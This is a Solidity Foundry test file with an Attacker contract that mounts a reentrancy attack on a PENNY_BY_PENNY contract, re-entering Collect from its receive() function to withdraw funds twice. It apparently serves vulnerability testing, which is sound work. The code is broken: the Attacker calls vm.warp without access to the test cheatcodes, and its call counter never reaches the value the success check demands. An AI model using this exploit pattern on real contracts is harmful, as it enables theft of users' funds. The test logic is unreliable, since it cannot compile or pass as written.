
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY} from "../src/PENNY_BY_PENNY.sol";
import {LogFile} from "../src/LogFile.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = PENNY_BY_PENNY(victimAddress);
    }

    function setupAttack(uint256 attackVal) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = attackVal;
        
        victim.Put{value: attackVal * 2}(0);
        vm.warp(block.timestamp + 1);
    }

    function attack(uint256 attackVal) public {
        uint256 initialBalance = address(this).balance;
        victim.Collect(attackVal);
        
        uint256 finalBalance = address(this).balance;
        if (attackCallCount == 2 && finalBalance > initialBalance) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
